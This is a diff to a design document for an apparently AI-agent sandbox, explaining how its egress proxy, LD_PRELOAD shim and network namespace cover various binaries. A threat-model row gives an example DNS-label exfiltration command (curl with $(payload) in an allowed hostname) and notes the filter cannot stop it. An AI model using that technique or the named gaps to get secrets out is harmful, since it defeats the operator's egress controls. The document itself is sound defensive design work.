@@ -20,6 +20,16 @@ Secrets are injected via environment variables (`CCLAW_SECRET_<NAME>`), never in
 
 Key insight: `CLONE_NEWNET` is the hard boundary. Everything else is convenience/defense-in-depth. A static binary that bypasses LD_PRELOAD gets zero network, not unrestricted network.
 
+**Terminology: "broker" vs "proxy" are not the same scope.** "Broker" names
+the whole forked per-call tool worker (`tool_shell_handler` et al.) — it sets
+up the sandbox, injects secrets, drains the output pipe, *and* hosts the
+egress proxy in a thread. "Proxy" / `ProxyContext` (`proxy.c`) names
+specifically the egress-decision-and-relay subsystem the broker stands up for
+that one call — `host_decide()`, `addr_permitted()`, `dial_ip()`, `relay()`.
+The proxy is a piece the broker hosts, not a synonym for it; keep the two
+words scoped that way in comments and docs so "the broker enforces X" doesn't
+get misread as "the whole tool-exec worker is the firewall."
+
 ## Architecture
 
 ```
@@ -105,6 +115,46 @@ Proxy → Client: "OK\n"                   (connection established)
 Build: `gcc -shared -fPIC -o libcclaw_net.so src/preload_net.c`
 Install: alongside agent binary or in workspace.
 
+## Coverage: which binaries actually get proxied
+
+Two independent on-ramps reach the same broker UDS, because "arbitrary
+LLM-issued shell command" and "cclaw's own libcurl in web_fetch/js_eval" need
+different interception strategies. Neither is a superset of the other, so a
+given binary's coverage depends on *how* it opens sockets:
+
+| Binary / runtime class                                   | Mechanism             | Why |
+|------------------------------------------------------------|------------------------|-----|
+| Dynamically-linked C/C++ (`curl`, `wget`, `git`, `openssh`, `nc`, `socat`, `openssl s_client`) | LD_PRELOAD | Resolves `connect()`/`getaddrinfo()` via normal dynamic symbol lookup — caught unconditionally, whether or not the tool itself knows about proxies. |
+| Dynamically-linked interpreters (CPython, Ruby, PHP, Perl) and their stdlib HTTP clients | LD_PRELOAD | The interpreter binary itself is dynamically linked; its socket layer calls libc `connect()` under the hood. |
+| JVM (`java.net.Socket`, NIO) | LD_PRELOAD | JNI native methods call libc `connect()` on Linux. |
+| Rust binaries built for a `gnu` (glibc) target | LD_PRELOAD | Rust std links the `libc` crate on glibc targets and calls through it. |
+| Go binaries using `net/http`'s default transport (`gh`, `kubectl`, `terraform`, `hugo`, most Go CLIs) | `net_shim` via `HTTP_PROXY` | Go's runtime always makes raw syscalls for networking (bypasses libc, so LD_PRELOAD is structurally blind to it), but `net/http.DefaultTransport` honors `HTTP_PROXY`/`HTTPS_PROXY` by default (`ProxyFromEnvironment`), so it still routes through the shim. |
+| musl-statically-linked binaries that read proxy env vars (Alpine-built tools, some Rust `musl`-target builds) | `net_shim` via `HTTP_PROXY` | Static linking means no libc symbol to interpose, but cooperative proxy support still routes them correctly. |
+| `web_fetch` / `js_eval` (cclaw's own libcurl) | `net_shim` via `HTTP_PROXY` only — LD_PRELOAD is deliberately *not* loaded for these tiers | Loading the preload here would intercept curl's own loopback connect to `net_shim` and fight the `HTTP_PROXY` path (see `preload_net.c`'s loopback-passthrough carve-out, needed only because shell tier runs both mechanisms at once). |
+| Anything both raw-syscall *and* proxy-ignorant: a raw `net.Dial` in Go, `nc`/`socat` with a manual dial, a from-scratch static binary calling `connect()` directly | **Neither** | `CLONE_NEWNET` has no interface for it to route through regardless — the call gets `ENETUNREACH` (or hangs) and the tool call fails. This is a *functionality* gap, not a *security* gap: nothing in this category can leak past policy, it simply gets no network. |
+
+The practical takeaway: coverage is good for the realistic population of
+tools an LLM-driven shell agent reaches for (curl-likes, scripting-language
+HTTP clients, common Go CLIs), and the remainder fails safe rather than fails
+open. If a tool call mysteriously gets "connection refused" or hangs with no
+proxy DENIED/ERROR ever logged, suspect this last row before suspecting the
+policy layer.
+
+### `channel_runner`: a separate tier with its own, narrower control
+
+`channel_runner.c` (the process that runs Telegram/etc. channel extensions —
+JS agents can author and promote via self-augmentation) is not proxy-fronted
+at all; it makes outbound HTTP directly via its own curl handles, with none
+of the LD_PRELOAD / `net_shim` / netns machinery above. It doesn't need an
+allowlist, because a channel is semantically "talks to one external service,"
+not arbitrary web access — so its egress control is a single-endpoint pin
+instead: `make_easy()`'s `url_host_allowed()` (in `src/channel_runner.c`)
+checks every outbound URL's host against the channel's own configured
+`base_url` (via `curl_url()`, exact-host-equality, fail-closed if `base_url`
+is unset) before any request goes out. This is the equivalent mechanism for
+this tier, not an oversight — a proxy/allowlist model would be the wrong
+shape for a process whose entire job is talking to one pre-known host.
+
 ## Secret Injection Model
 
 ```
@@ -150,6 +200,7 @@ LLM is told: "You have these secrets available as env vars: `$CCLAW_SECRET_GITHU
 | Base64-encoded secrets evade masking | Low probability; egress allowlist limits damage |
 | Shell child has secret in env memory | Ephemeral process; same as any CLI tool using env vars |
 | Proxy sees all traffic in plaintext (TLS passthrough) | Proxy only sees encrypted bytes; no MITM |
+| DNS query labels can carry exfiltrated data (`curl https://$(payload).allowed-suffix.com`) | `host_decide()`/`addr_permitted()` gate *which hostnames* may be resolved, not what's encoded in an otherwise-allowed query's label — the query itself leaves via the broker's real resolver before any connect/deny decision happens. Fundamental limit of hostname-allowlist egress filtering, not fixable within this pipeline; see `egress-filter.md` Q8 |
 
 ## Comparison: Previous Design (iptables REDIRECT) vs Current (LD_PRELOAD + UDS)
 
